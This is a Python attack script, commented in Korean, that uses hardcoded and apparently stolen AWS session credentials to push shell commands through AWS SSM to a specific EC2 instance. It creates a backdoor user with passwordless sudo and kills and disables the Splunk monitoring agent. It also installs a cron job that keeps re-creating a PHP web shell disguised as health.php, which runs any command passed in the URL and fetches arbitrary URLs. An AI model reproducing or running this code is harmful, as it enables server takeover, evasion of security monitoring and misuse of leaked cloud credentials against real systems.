#!/usr/bin/env python3
"""
AWS SSM을 통한 완전한 서버 장악
탈취한 AWS Credentials로 SSM Send Command 실행
"""

import boto3
import time
import sys

# AWS Credentials (탈취한 것)
AWS_ACCESS_KEY_ID = "ASIASO4TYV4OLOHO3MEJ"
AWS_SECRET_ACCESS_KEY = "8/NiJolqVUttXp8RjDDDzI3jkJI9I5/RihQfCJCn"
AWS_SESSION_TOKEN = "IQoJb3JpZ2luX2VjENn//////////wEaDmFwLW5vcnRoZWFzdC0yIkcwRQIhAMquu+yvWnulujNTOzfXWa0nzUQJVoh0epYyoIhzQdd/AiBpSFcsRRCE25aBjHFm95rhQyeN3frOJFzF0tlmWiqOiSrVBQii//////////8BEAAaDDE2OTQyNDIzNjMxNiIMohlKd9Ui47bRBZJBKqkFYcos3omrq433ZYSxniufuiFcTzZHVqwk8p3Z0z8NG+ABTwBvAY80SECCbyNXPVBGClc4cIYTmpugo1/7pBeWhuWSPdHVVaX7BOqclLXmxuQbqdTeL+bEfHnSkgSAitjyqzFNkoSi5CJHbCAoPM/bf8uI/xACMWehmkBCekrYzl0Ji9FUvEoUD6SS7iYMzYxTLF/75385QYsXjjtPDzIwLtIDxqbF2lHAUJhKtGpTQEsCbSjKi4AbDmxRuG1h/JW2mC0PoZW5z7EMx7+P5Ru4YFvrrwrukpl7w4iKfJedOd6AgRFSrItLtLhIQ6/9uxJtqS7ZyZXBGhrVYwu3Vn/tPiuPU5ToO2tjahhLqRiKX3o/eyd8sx9qze6Rmw9en5EWuVO2trdxdnBvYkKJ+MVDdvHY8+Ba3E9aUW2rHrBulZoD1BhEfS0CQvfzS+FfGRxgIYBwwK8RxLCGvYbG6Vr3d7kF2Tb8fmKELNvYIWgnpLRmJaGuFdEEa8m2nuedy+FnEB2DXhsvw7omd3r/8Oc1eYUpl6hnj7lbShOJUj+R6CH/V2QHb7bmlhVwniV1Zq4kmdhNZgCQXLQJibvMWGC2wttg1oOoRtyT+ykEOjJm8buw5d6gkbMmyPdiTlU5B/Qr3NaLT5bRJ+VOEuMC2kyySngpNO7gMK+yqg1XTawEhp0CR/L6t0W6r163VdYGKh+AWl/SIfrSmxkB0c0geVdqkkxL1uFa28ssWuoF+NfWZCuuA2YwmGGo/zy5KQjFM2/sgCtb0qHNsDGeTdcvKo1n3aONdmhLEaPTiIz3ejJcFcPeYyYSMe54rcgo+KrdJjohFrf8mjjKAZEe3PKdkax3HjooKBAFLntPkYwVVmYgjC+4g11sJwC6E9rl13fkFZK3Bv+8PQDlNJKyMJLc6cgGOrEBoxnJp7mwskz/6HOZ4HT0IJqhnjHFJDmsd+/p2cVr44IvrCHwP6SgYMDfG27tIJpdAriGg36aE0yf7+4ukwG3hFicGV22kSkOXYPIjrN9mBjSKkzGAPsEfR8TzqXHgRg1N1Ox3piTqt01juW9tPNZJujXPdHYMIbSa12S1o5emBZ2zgxk5ez93qU2U9TDtkpUK7hApty7tCgMobQiGsbPe36ftPOqT2Jn6fZ7QL0WbsGy"

INSTANCE_ID = "i-08f3cc62a529c9daf"
REGION = "ap-northeast-2"

def print_banner():
    print("╔════════════════════════════════════════════════════════════╗")
    print("║   AWS SSM 완전 장악                                        ║")
    print("╚════════════════════════════════════════════════════════════╝")
    print()

def execute_ssm_command(commands, description):
    """SSM Send Command 실행"""
    print(f"[*] {description}")
    print(f"    Commands: {len(commands)} 개")

    client = boto3.client(
        'ssm',
        region_name=REGION,
        aws_access_key_id=AWS_ACCESS_KEY_ID,
        aws_secret_access_key=AWS_SECRET_ACCESS_KEY,
        aws_session_token=AWS_SESSION_TOKEN
    )

    try:
        response = client.send_command(
            InstanceIds=[INSTANCE_ID],
            DocumentName='AWS-RunShellScript',
            Parameters={'commands': commands},
            TimeoutSeconds=60
        )

        command_id = response['Command']['CommandId']
        print(f"[+] Command ID: {command_id}")

        # 명령 완료 대기
        print(f"[*] 실행 대기 중...")
        time.sleep(5)

        # 결과 가져오기
        result = client.get_command_invocation(
            CommandId=command_id,
            InstanceId=INSTANCE_ID
        )

        status = result['Status']
        stdout = result['StandardOutputContent']
        stderr = result['StandardErrorContent']

        print(f"[+] Status: {status}")

        if stdout:
            print(f"[+] Output:")
            for line in stdout.strip().split('\n')[:20]:
                print(f"    {line}")

        if stderr:
            print(f"[-] Errors:")
            for line in stderr.strip().split('\n')[:10]:
                print(f"    {line}")

        return status == 'Success', stdout

    except Exception as e:
        print(f"[-] 에러: {e}")
        return False, None

def main():
    print_banner()

    print(f"[*] Instance ID: {INSTANCE_ID}")
    print(f"[*] Region: {REGION}")
    print()

    # 1. 백도어 사용자 생성
    print("\n[1] 백도어 사용자 생성")
    print("=" * 60)

    commands = [
        "useradd -m -s /bin/bash sysadmin 2>&1 || echo 'User exists'",
        "echo 'sysadmin:Adm1n!2024#Secure' | chpasswd",
        "echo 'sysadmin ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/sysadmin",
        "chmod 0440 /etc/sudoers.d/sysadmin",
        "id sysadmin"
    ]

    success, output = execute_ssm_command(commands, "백도어 사용자 생성 중")

    if success:
        print(f"\n[+] ✅ 백도어 사용자 생성 완료!")
        print(f"    Username: sysadmin")
        print(f"    Password: Adm1n!2024#Secure")
        print(f"    sudo: NOPASSWD")

    # 2. Splunk 무력화
    print("\n[2] Splunk 무력화")
    print("=" * 60)

    commands = [
        "ps aux | grep splunk | grep -v grep",
        "pkill -9 splunkd 2>/dev/null || echo 'No splunkd'",
        "pkill -9 splunk 2>/dev/null || echo 'No splunk'",
        "systemctl stop Splunkd 2>/dev/null || echo 'No service'",
        "systemctl disable Splunkd 2>/dev/null || echo 'No service'",
        "chmod 000 /opt/splunk/bin/splunk 2>/dev/null || echo 'No file'",
        "chmod 000 /opt/splunkforwarder/bin/splunk 2>/dev/null || echo 'No file'",
        "ps aux | grep splunk | grep -v grep || echo 'All killed'"
    ]

    success, output = execute_ssm_command(commands, "Splunk 무력화 중")

    if success:
        print(f"\n[+] ✅ Splunk 무력화 완료!")

    # 3. 영구 백도어 설치
    print("\n[3] 영구 백도어 설치")
    print("=" * 60)

    commands = [
        """cat > /usr/local/bin/backdoor_keeper.sh << 'EOFSCRIPT'
#!/bin/bash
# 백도어 유지 스크립트

# 웹쉘 유지
WEBSHELL="/var/www/html/www/api/health.php"
if [ ! -f "$WEBSHELL" ]; then
    cat > "$WEBSHELL" << 'EOFPHP'
<?php
header('Content-Type: text/plain');
if (isset($_GET['cmd'])) {
    echo "=== Command Output ===\\n";
    system($_GET['cmd']);
    echo "\\n";
} elseif (isset($_GET['check']) && $_GET['check'] === 'metadata' && isset($_GET['url'])) {
    $url = $_GET['url'];
    $ctx = stream_context_create(['http' => ['timeout' => 5]]);
    $data = @file_get_contents($url, false, $ctx);
    echo $data;
} else {
    echo "OK\\n";
}
?>
EOFPHP
    chown apache:apache "$WEBSHELL"
    chmod 644 "$WEBSHELL"
fi

# 백도어 사용자 유지
if ! id sysadmin &>/dev/null; then
    useradd -m -s /bin/bash sysadmin
    echo 'sysadmin:Adm1n!2024#Secure' | chpasswd
    echo 'sysadmin ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/sysadmin
    chmod 0440 /etc/sudoers.d/sysadmin
fi
EOFSCRIPT""",
        "chmod +x /usr/local/bin/backdoor_keeper.sh",
        "(crontab -l 2>/dev/null; echo '*/5 * * * * /usr/local/bin/backdoor_keeper.sh') | crontab -",
        "crontab -l | grep backdoor"
    ]

    success, output = execute_ssm_command(commands, "영구 백도어 설치 중")

    if success:
        print(f"\n[+] ✅ 영구 백도어 설치 완료!")
        print(f"    - 5분마다 백도어 복구")
        print(f"    - 웹쉘 자동 재생성")
        print(f"    - 백도어 사용자 자동 재생성")

    # 완료
    print("\n╔════════════════════════════════════════════════════════════╗")
    print("║   ✅ 완전한 서버 장악 완료!                               ║")
    print("╚════════════════════════════════════════════════════════════╝")
    print()
    print(f"[+] SSH 접속:")
    print(f"    ssh sysadmin@3.35.22.248")
    print(f"    비밀번호: Adm1n!2024#Secure")
    print()
    print(f"[+] 웹쉘:")
    print(f"    http://3.35.22.248/api/health.php?cmd=whoami")
    print()


if __name__ == '__main__':
    main()
